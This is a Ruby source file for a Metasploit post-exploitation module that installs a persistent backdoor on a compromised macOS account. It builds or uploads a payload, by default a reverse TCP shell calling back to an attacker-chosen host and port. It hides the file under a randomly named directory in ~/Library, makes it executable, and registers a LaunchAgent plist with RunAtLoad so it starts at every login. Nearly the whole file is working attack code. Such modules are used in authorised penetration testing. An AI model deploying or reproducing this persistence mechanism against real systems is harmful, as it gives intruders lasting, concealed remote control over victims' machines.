##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Mac OS X Persistent Payload Installer',
			'Description'   => %q{
				This module provides persistence boot payload via creating proper entry (plist) in LaunchAgents directory for current user.
			},
			'License'       => MSF_LICENSE,
			'Author'        => ['Marcin \'Icewall\' Noga  < marcin[at]icewall.pl >'],
			'Version'       => '',
			'Platform'      => [ 'osx' ],
			'SessionTypes'  => [ 'shell' ]
			))

		register_options(
			[
				OptAddress.new('LHOST', [true, 'IP for persistent payload to connect to.']),
				OptInt.new('LPORT', [true, 'Port for persistent payload to connect to.']),
				OptString.new('PAYLOAD', [true, 'Selected payload','osx/x86/shell_reverse_tcp']),
				OptString.new('BACKDOOR_FILE_NAME', [false, 'Backdoor file name. If not set, random name is generated.']),
				OptString.new('BACKDOOR_DIR_NAME', [false, 'Name of backdoor directory. If not set, random name is generated.']),
				OptString.new('BACKDOOR_TO_UPLOAD', [false, 'Path to backdoor ready to upload instead of generating payload.']),
			], self.class)
	end

	def run

		lhost = datastore['LHOST']
		lport = datastore['LPORT']
		payload = datastore['PAYLOAD']

		if datastore['BACKDOOR_TO_UPLOAD'].nil? or datastore['BACKDOOR_TO_UPLOAD'].empty?
			# Generate backdoor with selected payload
			backdoor_content = generate_backdoor(payload, lhost, lport)
		else
			print_status("Reading backdoor to upload")
			backdoor_content = ::IO.read(datastore['BACKDOOR_TO_UPLOAD'])
		end

		# Store backdoor on target machine
		backdoor_path  = write_backdoor(backdoor_content)

		# Add file to LaunchAgents dir
		add_launchctl_item(backdoor_path)
	end

	def generate_backdoor(name, lhost, lport, opts = "")
		print_status("Generating payload : #{name}")
		payload = session.framework.payloads.create(name)
		payload.datastore['LHOST'] = lhost
		payload.datastore['LPORT'] = lport
		# Validate the options for the module
		payload.options.validate(payload.datastore)
		# Grab necessary info about payload
		arch = payload.arch
		plat = payload.platform.platforms
		raw  = payload.generate
		# Create executable file
		print_status("Generating executable file")
		backdoor_content = ::Msf::Util::EXE.to_executable(session.framework,arch,plat,raw)

		if(!backdoor_content and plat.index(Msf::Module::Platform::Java))
		backdoor_content = payload.generate_jar.pack
		end

		return backdoor_content
	end

	def write_backdoor(backdoor_content)
		backdoor_file_name = datastore['BACKDOOR_FILE_NAME']
		backdoor_dir_name = datastore['BACKDOOR_DIR_NAME']

		# get user name
		user = cmd_exec("whoami")
		# generate dir name if needed
		if backdoor_dir_name.nil? or backdoor_dir_name.empty?
			backdoor_dir_name = Rex::Text.rand_text_alpha((rand(8)+6))
		end
		#generate file name if needed
		if backdoor_file_name.nil? or backdoor_file_name.empty?
			backdoor_file_name = Rex::Text.rand_text_alpha((rand(8)+6))
		end

		tmp_dir = "/Users/%s/Library/%s" % [user,backdoor_dir_name]
		#create dir
		cmd_exec("mkdir -p",tmp_dir)

		backdoor_path = tmp_dir + "/" + backdoor_file_name
		#TODO if a backdoor is a java/meterpreter version, add proper bash script for the execution or modify plist template
		if write_file(backdoor_path,backdoor_content)
			print_good("Backdoor stored to #{backdoor_path}")
			#set +x
			cmd_exec("chmod +x #{backdoor_path}")
		else
			print_error("Error during dropping backdoor")
		end
		return backdoor_path
	end

	def add_launchctl_item(path)
		# get user name
		user = cmd_exec("whoami")
		label = File.basename(path)
		plist_file = label + ".plist"
		plist_path = "/Users/" + user + "/Library/LaunchAgents/"
		#create dir..just to be sure
		cmd_exec("mkdir",plist_path)
		plist_path = plist_path + plist_file
		item = <<-EOI
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
		<plist version="1.0">
			<dict>
				<key>Label</key>
					<string>#{label}</string>
				<key>Program</key>
					<string>#{path}</string>
				<key>ProgramArguments</key>
					<array>
						<string>#{path}</string>
					</array>
				<key>RunAtLoad</key>
				<true/>
			</dict>
		</plist>
		EOI
		if write_file(plist_path,item)
			print_good("LaunchAgent added: #{plist_file}")
		else
			print_error("Error during adding LaunchAgent item")
		end

	end

end